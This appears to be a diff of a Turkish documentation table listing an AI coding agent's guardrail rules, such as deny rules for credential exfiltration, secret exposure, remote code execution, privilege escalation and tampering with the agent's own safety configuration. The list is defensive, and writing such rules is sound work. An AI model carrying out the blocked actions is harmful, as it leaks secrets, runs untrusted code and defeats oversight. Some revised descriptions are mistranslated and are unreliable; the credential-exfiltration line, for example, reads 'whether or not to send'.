-| `production-infra-change` | deny | evet | Canlı altyapıyı değiştirme. |
-| `git-history-rewrite` | deny | evet | Paylaşılan git tarihini yeniden yazma veya atma. |
-| `push-to-protected-branch` | instruct | evet | Korunan branşe doğrudan itme. |
-| `commit-on-protected-branch` | instruct | evet | Korunan branşe doğrudan commit yapma. |
-| `secret-exposure` | deny | evet | Kimlik bilgilerini okuma veya kopyalama. |
-| `credential-exfiltration` | deny | hayır | Sırları veya özel dosyaları makineden gönderme. |
-| `remote-code-execution` | deny | evet | İnternetten indirilen kodu çalıştırma. |
-| `privilege-escalation` | deny | evet | Yükseltilmiş ayrıcalıklarla çalıştırma. |
-| `database-destruction` | deny | evet | Veritabanı verilerini yok etme veya toplu değiştirme. |
-| `read-outside-workspace` | instruct | evet | Proje dışında dosya okuma. |
-| `agent-config-tampering` | deny | hayır | Aracının kendi güvenlik yapılandırmasını değiştirme. |
-| `system-modification` | instruct | evet | Sistem dışında değişiklik yapma proje. |
-| `env-secrets-dump` | instruct | evet | Ortam sırlarını yazdırma. |
-| `external-destructive-action` | deny | evet | Harici araç aracılığıyla geri döndürülemez işlem. |
-| `external-data-egress` | instruct | evet | Özel verileri harici araca gönderme. |
+| `destructive-deletion` | deny | evet | Yeniden oluşturulamayan verileri kalıcı olarak silmek. |
+| `production-infra-change` | deny | evet | Canlı altyapıyı değiştirmek. |
+| `git-history-rewrite` | deny | evet | Paylaşılan git tarihini yeniden yazmak veya atmak. |
+| `push-to-protected-branch` | instruct | evet | Korumalı bir dala doğrudan itmek. |
+| `commit-on-protected-branch` | instruct | evet | Korumalı bir dala doğrudan commit yapmak. |
+| `secret-exposure` | deny | evet | Kimlik bilgilerini okumak veya kopyalamak. |
+| `credential-exfiltration` | deny | hayır | Sırları veya özel dosyaları makineden gönderip göndermemek. |
+| `remote-code-execution` | deny | evet | İnternetten indirilen kodu çalıştırmak. |
+| `privilege-escalation` | deny | evet | Yüksek ayrıcalıklarla çalıştırmak. |
+| `database-destruction` | deny | evet | Veritabanı verilerini imha veya toplu değiştirmek. |
+| `read-outside-workspace` | instruct | evet | Proje dışındaki dosyaları okumak. |
+| `agent-config-tampering` | deny | hayır | Aracının kendi güvenlik konfigürasyonunu değiştirmek. |
+| `system-modification` | instruct | evet | Sistem değiştirmek proje dışında. |
+| `env-secrets-dump` | instruct | evet | Ortam sırlarını yazdırmak. |
+| `external-destructive-action` | deny | evet | Harici bir araç aracılığıyla geri alınamaz bir eylem. |
+| `external-data-egress` | instruct | evet | Özel verileri harici bir araca göndermek. |
